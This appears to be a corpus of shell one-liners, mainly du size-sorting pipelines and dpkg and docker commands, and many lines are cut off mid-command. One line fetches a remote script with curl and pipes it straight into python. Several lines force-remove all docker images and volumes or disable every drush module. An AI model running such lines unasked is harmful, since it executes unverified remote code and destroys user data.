du -sBM err.txt generated.file succ.txt | sort -n
du -sBM err.txt generated.file succ.txt | sort -g
du -s ./err.txt ./generated.file ./succ.txt | sort -nr
du -s -k -c err.txt generated.file succ.txt | sort -rn
du -s --si err.txt generated.file succ.txt | sort -h
du -s --block-size=1G --total /projects/scratch/insarlab/* | sort -nr
du -s *|sort -rn
du -s */* | sort -n
du -s err.txt generated.file succ.txt |sort -n
du -s err.txt generated.file succ.txt | sort -rn
du -s err.txt generated.file succ.txt | sort -nr
du -s err.txt generated.file succ.txt | sort -n
du -s err.txt generated.file succ.txt | sort -h
du -s err.txt generated.file succ.txt | sort -g
du -s err.txt generated.file succ.txt | grep \
du -s err.txt generated.file succ.txt .[a-zA-Z]* | sort -n
du -s err.txt generated.file succ.txt .[^.]* 2>/dev/null | sort -n
du -mx --max-depth=1 |sort -n
du -msc . .. | sort -n'
du -msc -- err.txt generated.file succ.txt | sort -n
du -msc err.txt generated.file succ.txt | sort -rn
du -msc err.txt generated.file succ.txt .*(N) | sort -n'
du -ms .*|sort -n
du -ms . .. | sort -n'
du -ms . .. | sort -n
du -ms *|sort -n
du -ms err.txt generated.file succ.txt | sort -rn
du -ms err.txt generated.file succ.txt | sort -n'
du -ms err.txt generated.file succ.txt | sort -n
du -ms err.txt generated.file succ.txt .*(N) | sort -n'
du -ms err.txt generated.file succ.txt .*(N) | sort -n
du -mh -d 1 . | gsort -hr
du -mh --max-depth=1 | sort -hr
du -mh --max-depth 1 . | sort -hr
du -md1 | sort -nr
du -mc -d 1 | sort -g
du -ma | sort -rn
du -ma | sort -n
du -m | sort -n
du -m | rg \
du -m -x -d 3 $HOME/Repos/src | awk '\$1 >= 500{print}'
du -m -x --max-depth=1 | sort -n
du -m -h -s -c -- err.txt generated.file succ.txt | sort -h
du -m -d 1|sort -nr
du -m -d 1 . | sort -n
du -m --max-depth=1|sort -n
du -m --max-depth=1 | sort -k1nr
du -m --max-depth 1 | sort -rn
du -m --max-depth 1 | sort -n
du -lsh err.txt generated.file succ.txt | sort --human-numeric-sort
du -ksx err.txt generated.file succ.txt | sort -n
du -ksh ./err.txt ./generated.file ./succ.txt | sort -n
du -ksh *|sort -n
du -ksh err.txt generated.file succ.txt | sort -hr
du -kscx .[[:alnum:]]* err.txt generated.file succ.txt 2>/dev/null |sort -n
du -ksc -- err.txt generated.file succ.txt | sort -n
du -ks /Users/janaka/Videos/* | sort -n
du -ks ./err.txt ./generated.file ./succ.txt | sort -nr
du -ks ./err.txt ./generated.file ./succ.txt | sort -n
du -ks *|sort -n
du -ks *| sort -n
du -ks err.txt generated.file succ.txt | sort -rn
du -ks err.txt generated.file succ.txt | sort -nr
du -ks err.txt generated.file succ.txt | sort -n
du -ks err.txt generated.file succ.txt 2>/dev/null | sort -n
du -khs err.txt generated.file succ.txt | sort -n
du -kh | tail -5
du -kh | tail -10
du -kh -d 1 | sort -hr
du -kP | grep -v './.*/'
du -k | sort -n
du -k | more
du -k | grep -v './.*\/'
du -k -s err.txt generated.file succ.txt | sort -k1 -g -r
du -k -d1 | sort -nr
du -k -d1 | sort -n
du -k --max-depth=1 | sort -n
du -k --max-depth=1 | sort +0 -8 -b -n -r
du -h|sort -n
du -h|sort -hr
du -hxs | sort -rn
du -hxs err.txt generated.file succ.txt | sort -hr
du -hxd1 | sort -h
du -hxd1 . | gsort -rh
du -hxd 1 | sort -h
du -hxBM --max-depth=1 . | sort -n
du -hx -d 1 -t 1G ~/ | sort -h
du -hx --max-depth=1 |sort -n
du -hx --max-depth=1 | sort -t 1 -n
du -hx --max-depth=1 | sort -n -r
du -hsxc ./err.txt ./generated.file ./succ.txt | sort -rh
du -hsx err.txt generated.file succ.txt | sort -rh
du -hsx err.txt generated.file succ.txt | sort -r
du -hsx err.txt generated.file succ.txt | sort -h
du -hsckx err.txt generated.file succ.txt | sort -nr
du -hsc . .. | sort -hr
du -hsc -- err.txt generated.file succ.txt | sort -h
du -hsc err.txt generated.file succ.txt | sort -rh
du -hsc err.txt generated.file succ.txt | sort -n
du -hsc err.txt generated.file succ.txt | sort -hr
du -hsc err.txt generated.file succ.txt | sort -hk1
du -hsc err.txt generated.file succ.txt | sort -h
du -hs | sort -h
du -hs `ls -A` | grep G
du -hs /var/log/alternatives.log /var/log/apt /var/log/bootstrap.log /var/log/btmp /var/log/dpkg.log /var/log/faillog /var/log/fontconfig.log /var/log/lastlog /var/log/nginx /var/log/tallylog /var/log/wtmp 2>/dev/null | egrep '^[^'$'\t'']+[MG]'
du -hs /usr/local/Cellar/elinks | gsort -h
du -hs ./err.txt ./generated.file ./succ.txt | sort -h
du -hs ./err.txt ./generated.file ./succ.txt | grep '[GM]'
du -hs . .. err.txt generated.file succ.txt | sort -h
du -hs *|sort -rh
du -hs *|sort -h
du -hs *| sort -n
du -hs *(/) | sort -h
du -hs err.txt generated.file succ.txt |sort -h
du -hs err.txt generated.file succ.txt | sort -rh
du -hs err.txt generated.file succ.txt | sort -nr
du -hs err.txt generated.file succ.txt | sort -hs
du -hs err.txt generated.file succ.txt | sort -hr
du -hs err.txt generated.file succ.txt | sort -h -r
du -hs err.txt generated.file succ.txt | sort -h
du -hs err.txt generated.file succ.txt | sort
du -hs err.txt generated.file succ.txt | less
du -hs err.txt generated.file succ.txt | gsort -hr
du -hs err.txt generated.file succ.txt | gsort -h
du -hs err.txt generated.file succ.txt | awk
du -hs err.txt generated.file succ.txt | /usr/local/Cellar/coreutils/8.21/libexec/gnubin/sort -h -r
du -hs err.txt generated.file succ.txt 2>/dev/null | sort -hr
du -hs err.txt generated.file succ.txt 2> /dev/zero | sort -h
du -hs err.txt generated.file succ.txt .[^.]* 2> /dev/null | sort -h
du -hs err.txt generated.file succ.txt .??* 2>/dev/null | egrep '^[^'$'\t'']+[G]'
du -hs err.txt generated.file succ.txt . .. | sort -h
du -hs err.txt generated.file succ.txt . .. 2>/dev/null | sort -hr
du -hs $1 | sort_file_sizes
du -hs $(ls -d */) 2>/dev/null | sort -nr
du -hs $(ls -A) | sort -h
du -hs $(find -mindepth 1 -maxdepth 1) 2>/dev/null | sort -hr
du -hd2 err.txt generated.file succ.txt | sort -hr H 10
du -hd1|sort -h
du -hd1 ~ | sort -h
du -hd1 | sort -hr
du -hd1 | sort -h
du -hd1 | sed -n '/[[:digit:]]G/p'
du -hd1 | gsort -h
du -hd1 2> /dev/null | sort -h
du -hd1 . |gsort -h
du -hd1 . 2>/dev/null | grep '[0-9]G\>'
du -hd 1| sort -h
du -hd 1 | sort -rh
du -hd 1 | sort -hr
du -hd 1 | sort -h
du -hd 1 | sort --human-numeric-sort --reverse
du -hd 1 | sort
du -hd 1 | gsort -h
du -hd 1 . | sort -rh
du -hd 1 --exclude './.*' | sort -hr
du -hcsx err.txt generated.file succ.txt | sort -nr
du -hcs .[!.]* err.txt generated.file succ.txt | sort -hr
du -hcs err.txt generated.file succ.txt | sort -h
du -hc | tail -n 1
du -hc | grep total
du -hc --max-depth=1 | sort -h
du -had1 | sort -h
du -had 1 | sort -rh
du -had 1 | sort -hr
du -had 1 | sort -h
du -hacd1 | sort -hr
du -hS | sort -nr
du -h ~/ | grep '^[0-9]*.[0-9]G'
du -h ~ | grep '[0-9\.]\+G'
du -h ~ --max-depth=2 | sort -h
du -h |sort -h
du -h | tail -n 1
du -h | sort -hr
du -h | sort -h
du -h | less
du -h | grep ^[0-9.]*M
du -h | grep ^[0-9.]*G
du -h | grep 8.0K
du -h | grep -e '^[0-9.]\+[MGT]\+'
du -h | grep -e '^[0-9.]\+[GT]\+'
du -h | awk 'END{print $1}'
du -h /Users/ain | grep \
du -h / | grep '[0-9]G '
du -h / 2> /dev/null | grep '[0-9\.]\+G'
du -h ./err.txt ./generated.file ./succ.txt | sort -h -r
du -h . | tail -n 1
du -h . | sort -h -r
du -h . | grep '^\s*[0-9\.]\+G'
du -h . | grep '\./[^/]*$'
du -h . | grep '[0-9\.]\+G'
du -h . | grep
du -h . 2>/dev/null | busybox grep -P '^[0-9.]+G'
du -h . -d 1 | sort -h
du -h . --max-depth 1 | sort -h
du -h . --max-depth 1 -x | sort -h
du -h . --human-readable | sort -h
du -h -x -d 1 ./ | grep M
du -h -x -d 1 ./ | grep G
du -h -s -d 1 | sort -h
du -h -s err.txt generated.file succ.txt | sort -n
du -h -s err.txt generated.file succ.txt | grep -vE
du -h -max-depth=1 | sort -h
du -h -d1 | sort -r -k1 -n
du -h -d1 | sort -r
du -h -d1 | sort -k1hr
du -h -d1 | sort -hr
du -h -d1 | sort -h
du -h -d1 | gsort -hr
du -h -d1 2> /dev/null | sort -hr
du -h -d1 -x | sort -h
du -h -d 3 . | grep '^\s*[0-9\.]\+G'
du -h -d 2 | sort -n
du -h -d 2 | sort -h
du -h -d 2 | grep --line-buffer -e '^\s*\d*\.\d*G'
du -h -d 2 . | sort -h
du -h -d 1|sort -h
du -h -d 1 | sort -rh
du -h -d 1 | sort -r
du -h -d 1 | sort -n
du -h -d 1 | sort -hr
du -h -d 1 | sort -h -k 1
du -h -d 1 | sort -h -
du -h -d 1 | sort -h
du -h -d 1 | sort -bh
du -h -d 1 | sed -e 's/\.\///g' -e 's/\.$/<-- Total dir size/'
du -h -d 1 | gsort -rh
du -h -d 1 | gsort -r -h
du -h -d 1 | gsort -hr
du -h -d 1 | gsort -h
du -h -d 1 . | sort -n -r
du -h -d 1 . | sort -n
du -h -d 1 . | sort -hr
du -h -d 1 . | sort -h
du -h -d 1 . 2> /dev/null | sort -h
du -h -d 1 -x | sort -r -h
du -h -c ./ | tail -1
du -h -c -d 1 | gsort -h -r
du -h -c -d 1 . | sort -h -r
du -h -a -x -d 1 | sort --human-numeric-sort
du -h -a --max-depth=1 | sort -h
du -h --time --max-depth=1|sort -hr
du -h --max-depth=3 | grep G
du -h --max-depth=1|sort -rh -k 1
du -h --max-depth=1|sort -rh
du -h --max-depth=1|sort -h
du -h --max-depth=1| sort -hrk1
du -h --max-depth=1 |sort
du -h --max-depth=1 | sort -rh
du -h --max-depth=1 | sort -r
du -h --max-depth=1 | sort -nr
du -h --max-depth=1 | sort -n -r
du -h --max-depth=1 | sort -n
du -h --max-depth=1 | sort -hr
du -h --max-depth=1 | sort -h -r
du -h --max-depth=1 | sort -h
du -h --max-depth=1 | sort
du -h --max-depth=1 2>/dev/null |\grep -E '([0-9]+G)'
du -h --max-depth=1 ./err.txt ./generated.file ./succ.txt | sort -h
du -h --max-depth=1 . | sort -n -r
du -h --max-depth=1 . | sort -k1h
du -h --max-depth=1 . | sort -hr
du -h --max-depth=1 . | sort -h
du -h --max-depth=1 . | grep -eM -eG
du -h --max-depth=1 $1 | sort -n -r
du -h --max-depth=0 | sort -n -r
du -h --max-depth=0 `pwd` | sort -rn
du -h --max-depth=0 err.txt generated.file succ.txt | sort -hr
du -h --max-depth 1 | sort -k 1n
du -h --max-depth 1 | sort -h
du -h --all --max-depth=1 --one-file-system 2> /dev/null | sort -h
du -h err.txt generated.file succ.txt | sort -n
du -gd1 | sort -nr
du -d1|sort -h
du -d1h | sort -h
du -d1 | sort -n
du -d1 -t10M -h 2>/dev/null | sort -hr
du -d1 -m | sort -n
du -d1 -h|sort -hr
du -d1 -h | sort -hr
du -d1 -h | sort -h
du -d 1 | sort -n
du -d 1 | sort -h
du -d 1 -k | sort -n
du -d 1 -k . | sort -n
du -d 1 -hc | sort -h
du -d 1 -h |$SORT_COMMAND -rh
du -d 1 -h | sortdu.pl
du -d 1 -h | sort -n
du -d 1 -h | sort -k 1g
du -d 1 -h | sort -hr
du -d 1 -h | sort -h
du -d 1 -h | sort --sort=human-numeric
du -d 1 -h | sort
du -d 1 -h | gsort -hr
du -d 1 -h | gsort -h
du -d 1 -h | grep M
du -d 1 -h | grep K
du -d 1 -h | grep -i
du -d 1 -h | grep
du -d 1 -h . | sort -n
du -d 1 -h . | sort -h
du -d 1 -h . 2>/dev/null | sort -h -r
du -d 1 -h -a | sort -h
du -d 1 -h -a 2>/dev/null | sort -h
du -d 1 -ah | sort -h
du -d 0 -h .git | awk '{ print \$1 }'
du -d 0 -h err.txt generated.file succ.txt | sort -hr
du -csk -- err.txt generated.file succ.txt .[^.]* | sort -n
du -csh .[!.]* err.txt generated.file succ.txt |sort -h
du -csh .[!.]* err.txt generated.file succ.txt | sort -h
du -csh .??* |sort -rh
du -csh *.wav|tail -1;sudo cdrecord speed=2 -eject -dao -pad -audio *.wav
du -csh err.txt generated.file succ.txt |sort -rh
du -csh err.txt generated.file succ.txt | sort -rh
du -csh err.txt generated.file succ.txt | sort -h
du -cs err.txt generated.file succ.txt | sort -h
du -cms err.txt generated.file succ.txt | sort -rn
du -cksh .[!.]* err.txt generated.file succ.txt | sort -h
du -cksh . | sort -rh
du -cksh err.txt generated.file succ.txt | sort -rn
du -cksh err.txt generated.file succ.txt | sort -rh
du -cksh err.txt generated.file succ.txt | sort -hr
du -cksh err.txt generated.file succ.txt | sort -h
du -cksh err.txt generated.file succ.txt | gsort -hr
du -cksh err.txt generated.file succ.txt .[!.]* | sort -hr
du -cks err.txt generated.file succ.txt | sort -rn
du -cks err.txt generated.file succ.txt | sort -nr
du -ckhs err.txt generated.file succ.txt | sort -hr
du -ch|tail
du -chx --max-depth=3 | sort -rh
du -chx --max-depth=2 | sort -rh
du -chx --max-depth=1 | sort -rh
du -chx --max-depth=0 | sort -rh
du -chs .[!.]* err.txt generated.file succ.txt | sort -rn
du -chs *|sort -hr
du -chs err.txt generated.file succ.txt | sort -h
du -chd 1 | sort -h
du -chaxd 1 | sort -hr
du -chad 1 | sort -h
du -cha --max-depth 2 2>/dev/null | sort -h
du -ch |tail -1
du -ch | vim -
du -ch | tail -1
du -ch | sort -h
du -ch | sort --human-numeric-sort
du -ch | grep total
du -ch | grep 'M '
du -ch | grep 'G '
du -ch 2>/dev/null | tail -1
du -ch 2> /dev/null |tail -1
du -ch 2> /dev/null | tail -1
du -ch ./ | tail -1
du -ch . | tail -n 1
du -ch . | tail -1
du -ch -t 50M -d 0 err.txt generated.file succ.txt .??* | sort -h
du -ch -d 4 | sort -h
du -ch -d 3 | sort -h
du -ch -d 2 | sort -h
du -ch -d 1 | sort -r
du -ch -d 1 | sort -h
du -ch -d 1 2>/dev/null | sort -h
du -ch --max-depth=1 | tail -1
du -ch --max-depth=1 | sort -hr
du -ch --max-depth=1 | sort -h
du -ch --max-depth=1 ./ |sort -rh
du -cah | sort -h
du -cBM -d1 2> >(grep -v 'Permission denied') | sort -n
du -cBM --max-depth=1 | sort -n
du -cBM --max-depth=1 2> >(grep -v 'Permission denied') | sort -n
du -cBM --max-depth=1 2> /dev/null | sort -nr
du -c | sort -n
du -c | grep total
du -c 2>/dev/null | tail -1
du -c err.txt generated.file succ.txt | sort -nr
du -c err.txt generated.file succ.txt | sort -n
du -b -d 1 | sort -n
du -a|awk '{print \$2}'
du -axhd1 | sort -h
du -ash . .. | sort -h
du -ah|grep
du -ahl -d 1 | sort -h
du -ahd1 | sort -hr
du -ahd1 | sort -h
du -ahd 1 | sort -hr
du -ahd 1 | sort -h
du -ahd 1 | sort --human-numeric-sort
du -ah | sort -h
du -ah | less
du -ah | grep -E \
du -ah /home | sort -n
du -ah . | grep -v
du -ah -d1 | sort -n
du -ah -d1 | sort -hr
du -ah -d 1 | sort -rh
du -ah --max-depth=1 | sort -hr -T .
du -ah --max-depth=1 | sort -h
du -ah --max-depth=1 | sort
du -ah --max-depth=0 --block-size=MB --time err.txt generated.file succ.txt | sort -nr
du -ah --max-depth 1 | sort -h
du -ah err.txt generated.file succ.txt -d 0 | sort -h
du -achd1 | sort -h
du -ach | sort -n -r
du -ach | sort -m $@
du -ach | sort -h
du -ach --max-depth=1 | sort -h
du -aH | grep $1
du -a | sort -nr > space.txt
du -a | sort -nr
du -a | grep
du -a .|sort -n -r
du -a . |grep
du -a . | sort -n -r
du -a -t 1M -d 1 | sort -rh
du -a -h -d1 | sort -hr
du -a -h -d1 | sort -h
du -a -h -d 1 | sort -h -r -b
du -a -h --max-depth=1 | sort -n
du -a -h --max-depth=1 | sort -hr
du -a -h --max-depth=1 | sort -h
du -a -d 1 -m |sort -nr
du -a -d 1 -h --time | sort -h
du -a --max-depth=1 | sort -n
du -a --max-depth=1 | sort -h
du -a --max-depth 1 . .. | sort -g
du -S|sort -n
du -S | sort -n -r
du -S | sort -n
du -S . | sort -nr
du -S . | sort -n
du -Psx err.txt generated.file succ.txt | sort -n
du -Psmx err.txt generated.file succ.txt 2>/dev/null | sort -nr
du -Pscxm err.txt generated.file succ.txt | sort -nr
du -Psckx err.txt generated.file succ.txt | sort -nr
du -Phc -d 1 | sort -h
du -L -h --max-depth=1 2>/dev/null |\grep -E '([0-9]+G)'
du -H -msh err.txt generated.file succ.txt | sort -n'
du -H --max-depth=1 . | sort -n -r
du -BM | sort -n
du -BM -d 1 | sort -n
du -BM --max-depth 1 2>/dev/null | sort -n
du -BG -d 1 --time |sort -nr
du --total --summarize --human-readable err.txt generated.file succ.txt | sort --human-numeric-sort
du --summarize err.txt generated.file succ.txt | sort --human-numeric-sort
du --si --max-depth=1 -b | sort -n
du --max-depth=3 --block-size=1M -h | sort -n
du --max-depth=3 --block-size=1G -h | sort -n
du --max-depth=2 --block-size=1M -h | sort -n
du --max-depth=2 --block-size=1G -h | sort -n
du --max-depth=1|sort -n
du --max-depth=1 | sort -rg
du --max-depth=1 | sort -nr
du --max-depth=1 | sort -n
du --max-depth=1 | sort -k2
du --max-depth=1 | sort -h
du --max-depth=1 . | sort -n
du --max-depth=1 -x --block-size=1048576 | sort -nr
du --max-depth=1 -m | sort -n
du --max-depth=1 -k | sort -rn
du --max-depth=1 -h| sort -n -r
du --max-depth=1 -hc | sort -n
du --max-depth=1 -h |sort -h
du --max-depth=1 -h | sort -rh
du --max-depth=1 -h | sort -nr
du --max-depth=1 -h | sort -k 1h
du --max-depth=1 -h | sort -hr
du --max-depth=1 -h | sort -h
du --max-depth=1 -h 2>/dev/null | sort -h
du --max-depth=1 -h . | sort -n -r
du --max-depth=1 -h --apparent-size | sort -rh
du --max-depth=1 -c -h | sort -h
du --max-depth=1 -bch | sort -hr
du --max-depth=1 -b | sort -k1 -rn
du --max-depth=1 -a -h | sort -h
du --max-depth=1 -B M | sort -g
du --max-depth=1 --human-readable | sort -h -r
du --max-depth=1 --human-readable | sort --human-numeric-sort --key=1
du --max-depth=1 --human-readable | sort --human-numeric-sort
du --max-depth=1 --human-readable --threshold=1M --one-file-system | sort --general-numeric-sort
du --max-depth=1 --human-readable --threshold=1G --one-file-system | sort --general-numeric-sort
du --max-depth=1 --block-size=MiB | sort -n
du --max-depth=1 --block-size=M --one-file-system | sort -nr
du --max-depth=1 --block-size=1M -h | sort -n
du --max-depth=1 --block-size=1G -h | sort -n
du --max-depth 1 -m | sort -n
du --max-depth 1 -h | sort -h
du --inodes -S | sort -h
du --human-readable --total -d 3 --block-size=M --threshold=1M | sort -rn
du --human-readable --total -d 3 --block-size=M --threshold=1M --separate-dirs | sort -rn
du --human-readable --total -d 2 --block-size=M --threshold=1M | sort -rn
du --human-readable --total -d 1 --block-size=M --threshold=1M | sort -rn
du --human-readable --total --max-depth=1 | sort --human-numeric-sort
du --human-readable --threshold=1M --one-file-system | sort --general-numeric-sort
du --human-readable --threshold=1G --one-file-system | sort --general-numeric-sort
du --human-readable --summarize err.txt generated.file succ.txt | sort --human-numeric-sort --reverse
du --human-readable --max-depth=3 2>/dev/null | sort --human-numeric-sort
du --human-readable --max-depth=2 2>/dev/null | sort --human-numeric-sort
du --human-readable --max-depth=1 2>/dev/null | sort --human-numeric-sort
du --exclude=yesterday --max-depth=2 -h | sort -h
du --exclude=.OldFiles -c --max-depth=2 | sort -n
du --block-size=MiB --max-depth=1 | sort -nr
du --block-size=MiB --max-depth=1 | sort -n
du --block-size=M --total --max-depth=1 --all | sort -g
du --block-size=KiB --max-depth=1 | sort -n
du --block-size=GiB --max-depth=1 | sort -n
du --block-size=1M --max-depth=1 --one-file-system | sort --numeric-sort
du --all --max-depth=1 | sort -n
du err.txt generated.file succ.txt . .. -hs | sort -h
du err.txt generated.file succ.txt -sh | sort -hr
du err.txt generated.file succ.txt -sh | sort -h
du err.txt generated.file succ.txt -hs | sort -h
dt=`date +%V`; cat ~/.today | grep -E -e \
dscl . list /Users | grep -v ^_.*
dscl . list /Users | grep -v ^_
dscl . list /Users | grep -v '_'
dscl . list /Users | grep -v '^_'
dscl . list /Group | grep -v '^_'
dscl . -read /Users/\$(logged_in_user) NFSHomeDirectory | awk '{print \$NF}'
dscacheutil -q user | grep -A 4 -B 2 -e uid:\ 5'[0-9][0-9]'
dscacheutil -q user | grep -A 3 -B 2 -e uid:\ 5'[0-9][0-9]'
dscacheutil -q group | grep users
drush wd-show --tail | ~/bin/wd-show/js/main.js
drush up -n | grep -ir 'available'
drush pml | grep -i not
drush pml | grep -i enabled
drush pml | grep -i disabled
drush pml --no-core --type=module --status=enabled --pipe | xargs drush -y dis
drush fl | grep -i enabled
drush @self uli --no-browser | xclip
drush $(drush sa | grep ^@\.*\.mcdev)
dropbox stop && echo 100000 | sudo tee /proc/sys/fs/inotify/max_user_watches ; dropbox start
dropbox &|
dpse | cut -f1 --delim=\
dpsa|xargs -r -I@ docker stop @
dpsa|xargs -r -I@ docker rm @
dpsa | grep Exit
dpla | grep
dpkg-query -l | grep -i
dpkg-query -l | grep
dpkg-query -f '\${binary:Package}\n' -W | grep
dpkg-query -Wf '\${Installed-size}\t\${Package}\n' | sort -n
dpkg-query -Wf '\${Installed-Size}\t\${Package}\n' | sort -n
dpkg-query -Wf '${Installed-Size}\t${Package}\n' | sort -n
dpkg-query -W -f='\${Conffiles}\n' '*' | awk 'OFS=\
dpkg-query -W --showformat='\${Installed-Size} \${Package}\n' | sort -n -r
dpkg -s $@ | grep ^Version:
dpkg -s $1 | grep Status
dpkg -l|grep --color=always
dpkg -l|grep
dpkg -l |grep -i
dpkg -l |grep
dpkg -l |awk '/^[hi]i/{print $2}'
dpkg -l | less -S
dpkg -l | less
dpkg -l | grep ezfw
dpkg -l | grep ezFramework
dpkg -l | grep ^ii
dpkg -l | grep \
dpkg -l | grep -i
dpkg -l | grep -c ^i
dpkg -l | grep -E ^rc
dpkg -l | grep '^rc'
dpkg -l | grep $@
dpkg -l | grep $1
dpkg -l | grep
dpkg -l | egrep
dpkg -l | command grep --color=auto
dpkg -l | cgrep -i $1
dpkg -l | awk '/^[r]c/{print $2}'
dpkg -l | awk '/^[hi]i/{print $2}'
dpkg -l linux-image-\* | grep ^ii
dpkg -l linux-* | awk
dpkg -l 'linux-*' | sed '/^ii/!d;/'\
dpkg -l 'linux-*' | sed '/^ii/!d;/'
dpkg -l 'linux-*' | sed '/^ii/
dpkg -L util-linux | egrep
dpkg -L coreutils | egrep
dpkg -L binutils | ack
dpkg --status bluez | grep '^Version:'
dpkg --purge $(COLUMNS=200 dpkg -l | grep
dpkg --list | less
dpkg --list | igrep
dpkg --list | grep linux-image
dpkg --list | grep ^i
dpkg --list | grep
dpkg --list | ack -i
dpkg --get-selections|grep
dpkg --get-selections| igrep
dpkg --get-selections |grep linux-\[him\]
dpkg --get-selections |grep linux
dpkg --get-selections |grep -v deinstall
dpkg --get-selections | more
dpkg --get-selections | grep hold
dpkg --get-selections | grep -v deinstall >$HOME/apt-list.lst ; echo saved on $HOME/apt-list.lst
dpkg --get-selections | grep -v deinstall
dpkg --get-selections | grep -i
dpkg --get-selections | grep
dpkg --get-selections | egrep -i
dpkg --get-selections | cut -f 1
dpkg --get-selections | awk 'BEGIN {exitcode=1}; \$2==\
dpkg --get-selections | awk
dpicker | xargs docker top
dpicker | xargs docker rm -f
dpicker | xargs docker logs -f
dpicker | xargs docker inspect
dpicker | xargs -I HASH exec -it HASH bash
dpa -q|xargs docker rm
dox-do rake -T | grep
dox-do rails routes | grep
down=$(ls -rt -d -1 ~/Downloads/* | tail -n 1) && cp $down ./
dotfiles ls-files | xargs -I{} git --git-dir=$HOME/.dotfiles --work-tree=$HOME add {}
dotcfg tag | sort -V
dotcfg ls-files | grep
dot -Tpng | open -f -a preview
dot -Tpng | feh --scale-down -
dot -Tpng <(terraform graph) | open -a Preview.app -f
dot -Tpdf | okular - \&
dos2unix | smaps2line
dos2unix $(git status --porcelain | sed s/^...//)
doing done; doing recent 1 | dayone new
dog ~/.bashrc|grepc
dof -e /usr/share/fortunes/*.dat do echo %b | columns
dockviz images -d | dot -Tpng -o images.png
docker-ps-format|grep
docker-machine stop ${{cookiecutter.envvar_prefix|upper}}_MACHINE
docker-machine start ${{cookiecutter.envvar_prefix|upper}}_MACHINE
docker-machine rm ${{cookiecutter.envvar_prefix|upper}}_MACHINE
docker-machine ls -q | xargs docker-machine regenerate-certs -f
docker-machine ip dockerhost | pbcopy
docker-machine ip ${{cookiecutter.envvar_prefix|upper}}_MACHINE
docker-machine env default | grep DOCKER_HOST
docker-compose up | watch docker ps -a
docker-compose up | ccze -A
docker-compose stop && docker-compose rm && docker images -q | xargs docker rmi
docker-compose logs -t | less
docker-compose logs -f --tail=10 | ccze -A
docker-compose logs --tail 3000 -f | lh
docker volume rm \$(docker volume ls | awk '{ print $2 }')
docker volume ls | xargs docker volume rm
docker volume ls -qf dangling=true |xargs -ti docker volume rm {}
docker volume ls -qf dangling=true | xargs docker volume rm
docker volume ls -qf dangling=true | xargs -r docker volume rm && \
docker volume ls -qf dangling=true | xargs -r docker volume rm
docker volume ls -qf dangling=true | xargs --no-run-if-empty docker volume rm
docker volume ls -qf 'dangling=true' | xargs docker volume rm
docker volume ls -qf 'dangling=true' | xargs -r docker volume rm
docker volume ls -q | xargs docker volume rm -f
docker volume ls -q | xargs docker volume rm
docker volume ls -q | xargs -i docker volume rm {}
docker volume ls -q | xargs --no-run-if-empty docker volume rm
docker volume ls -q | parallel docker volume rm {}
docker volume ls -q -f dangling=true | xargs docker volume rm
docker volume ls -q -f dangling=true | xargs -t docker volume rm
docker volume ls -q -f 'dangling=true' | xargs docker volume rm
docker volume ls -f dangling=true -q | xargs docker volume rm
docker volume ls --quiet --filter dangling=true | xargs docker volume rm
docker volume ls --format '{{.Name}}' | xargs -L1 -I {} docker run -it --rm -v {}:/mnt alpine ls -laR /mnt
docker volume ls --filter dangling=true | xargs docker volume rm
docker system df -v | grep \
docker stop `docker ps -q|head -1`
docker stop -t 0 $(docker ps -a -q) | xargs docker rm
docker stop $(docker ps | awk {
docker stop $(docker ps -aq | head -n 1)
docker start 2bc8a998f8c2 | pbcopy && docker logs -f $(pbpaste)
docker start $(docker ps -a | grep
docker service ls | grep homelab
docker run -ti `docker images -q | head -1` /bin/bash
docker run -it --rm -v /opt/homeassistant/config:/config -v /etc/localtime:/etc/localtime:ro homeassistant/amd64-homeassistant hass -c /config --script check_config && docker restart homeassistant | lolcat
docker run -it $(docker image ls -a --format={{.ID}} | head -1) bash
docker run -i --rm --log-driver none --name yq kopiczko/yq . | jq
docker run -e HOST_IP=$(ifconfig en0 | awk '/ *inet /{print $2}') -v ~/Developer/workspace/ubuntu -t -i ubuntu.varnish /bin/bash
docker run -d `docker images -q|head -1`
docker run -d -p 8080:8080 -p 1521:1521 -v /Users/asolberg/Development/oracle_data/u01/app/oracle:/u01/app/oracle 12c | pbcopy && docker logs -f $(pbpaste)
docker run --rm python:2.7 curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py |python -
docker run --rm drupal tar -cC /var/www/html/sites . | tar -xC ~/www/d8_docker/sites
docker run --rm andyneff/uuidgen uuidgen -t | pbcopy && pbpaste && echo
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -v /etc:/etc spotify/docker-gc && docker volume rm $(docker volume ls --filter dangling=true -q | egrep \
docker run --rm -it -w /home/tf -v `echo $PWD | sed -r 's/\/mnt(.*)/\1/'`:/home/tf hashicorp/terraform:light
docker run --rm -it -v `echo $HOME | sed -r 's/\/mnt(.*)/\1/'`/.aws:/root/.aws dsudo/aws-cli:1.0
docker run --rm -it $(docker images -q | head -1)
docker rmi `docker images | awk '$1 ==
docker rmi `docker images | awk
docker rmi \`docker-img | grep \
docker rmi \$(docker images | grep \
docker rmi \$(docker images | grep -e \
docker rmi \$(docker images | awk '{if (\$2 == \
docker rmi \$(docker images | awk '/^<none>/ { print \$3}')
docker rmi \$(docker images -a | awk '/^<none>/ { print \$3 }')
docker rmi -f $(docker images | grep
docker rmi -f $(docker images -q); docker ps --filter status=dead --filter status=exited -aq | xargs -r docker rm -v
docker rmi -f $(docker images -a | grep
docker rmi $(paste | awk
docker rmi $(docker images | grep
docker rmi $(docker images | awk -F ' ' '{print $3}') -f
docker rmi $(docker images | awk '/^<none>/ { print $3 }')
docker rmi $(docker images | awk '/^<none/ {print $3}')
docker rmi $(docker images | awk
docker rmi $(docker images -q | tail -n +5)
docker rmi $(docker images -a | grep
docker rmi $(docker images -a | awk 'FNR > 1 {print $3}')
docker rmi $(docker images -a | awk '/^<none>/{print $3}')
docker rmi $(docker images -a | awk
docker rmi $(daims | grep
docker rmi $( daims | awk '{print}' RS='\n' ORS=' ')
docker rm -v $(docker ps -a | grep -P
docker rm -f $(docker ps -q -a | tr '\n' ' ')
docker rm -f $(docker ps -aq | tr '\n' ' ')
docker rm -f $(docker ps -aq | head -1)
docker rm $(docker ps -a | awk 'FNR > 1 {print $1}')
docker rm $(docker ps -a -f status=exited | awk '{if (NR!=1) print $1;}')
docker rm $(docker ps -a -f STATUS=exited | awk '{print }')
docker rm $( dacs | awk '{print}' RS='\n' ORS=' ')
docker restart homeassistant | lolcat
docker ps | yank
docker ps | less -SEX
docker ps | less -S
docker ps | less
docker ps | head -8
docker ps | grep airflow
docker ps | grep $1
docker ps | grep
docker ps | cut -c-$(tput cols)
docker ps | awk -F\
